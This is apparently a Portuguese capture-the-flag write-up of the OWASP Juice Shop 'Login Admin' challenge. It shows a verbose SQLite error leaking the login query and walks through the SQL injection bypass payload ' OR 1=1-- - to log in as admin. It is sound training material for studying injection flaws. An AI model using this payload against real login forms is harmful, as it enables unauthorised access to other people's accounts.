# Injection

## Login Admin

> Faça login com a conta do administrador.

Para esse desafio, podemos navegar até a página de autenticação e tentar manipular a lógica de autenticação. Supondo que o banco de dados utilize [SQL](https://aws.amazon.com/pt/what-is/sql/), podemos interceptar a requisição, inserir um apóstrofo `'` no campo de e-mail e observar o comportamento da aplicação. Ao enviar a requisição modificada, obtive a seguinte resposta em JSON:

{% code overflow="wrap" %}
```json
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"96ca9d2f94b871e6933b51800e24e917\"",
    "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = ''' AND password = '96ca9d2f94b871e6933b51800e24e917' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = ''' AND password = '96ca9d2f94b871e6933b51800e24e917' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '96ca9d2f94b871e6933b51800e24e917' AND deletedAt IS NULL",
    "parameters": {}
  }
}
```
{% endcode %}

Perceba que a aplicação retorna um erro excessivamente verboso, indicando detalhadamente o que houve no back-end[^1]. Isso indica que há a possibilidade de [SQL Injection](https://www.kaspersky.com.br/resource-center/definitions/sql-injection), pois podemos manipular a consulta e alterar o funcionamento da consulta ao banco de dados. Dessa forma, podemos tentar alterar a consulta para que o banco de dados retorne o primeiro resultado da tabela `Users` inserindo o payload `' OR 1=1-- -`. Tendo como base a consulta que foi retornada no erro, ao inserir esse payload, ela ficará da seguinte forma:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1-- -' AND password = '96ca9d2f94b871e6933b51800e24e917' AND deletedAt IS NULL
```

Ou seja, a consulta está **PEDINDO** (SELECT) para o banco de dados uma instância **DA** **ENTIDADE** (FROM) `Users` **A QUAL** (WHERE) o campo `email` seja vazio (email='') **OU** o numeral 1 seja igual a 1 (1=1). Por fim, é utilizado o `-- -` para indicar que toda instrução a partir da que informamos seja considerada um comentário e não seja processada pelo banco de dados. Dessa forma, a instrução é encerrada e como a condição 1=1 só pode ser verdadeira, o banco de dados entende que precisa retornar o primeiro resultado da tabela, que nesse caso é o `admin`, o que nos garante acesso à conta do administrador e soluciona o desafio.



[^1]: a parte da aplicação responsável por tratar as consultas ao banco de dados
